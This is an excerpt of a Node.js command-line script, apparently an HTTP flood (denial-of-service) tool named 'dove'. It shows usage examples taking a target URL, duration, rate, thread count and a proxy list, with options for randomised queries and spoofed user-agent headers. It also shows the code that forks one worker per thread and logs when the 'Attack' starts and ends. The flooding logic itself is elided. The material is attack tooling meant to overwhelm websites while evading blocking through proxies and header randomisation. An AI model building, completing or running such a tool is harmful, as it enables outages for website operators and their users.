...
if (process.argv.length < 7) {
    ...
    // --------------------------
    log('Examples -')
    log(' ./dove https://localhost.com 120 20 64 proxy.txt')
    log(' ./dove https://localhost.com 120 20 64 proxy.txt -d 30 -s -e')
    log(' ./dove https://localhost.com 120 20 64 proxy.txt --query %RAND% --log 200')
    log(' ./dove https://localhost.com 120 20 64 proxy.txt -h user-agent@test_ua -h accept@*/*')
    log(' ./dove https://localhost.com 120 20 64 proxy.txt -h user-agent@"Mozilla %RAND-16%"')
    process.exit();
}
...
if (cluster.isPrimary) {
    ...
    log("web".cyan + "  " + `Attack ${args.target} started.`.white);
    for (let i = 0; i < args.threads; i++) {
        cluster.fork()
    }

    setTimeout(() => {
        log("web".cyan + "  " + `Attack is over.`.white);
        process.exit(1);
    }, args.time * 1000);
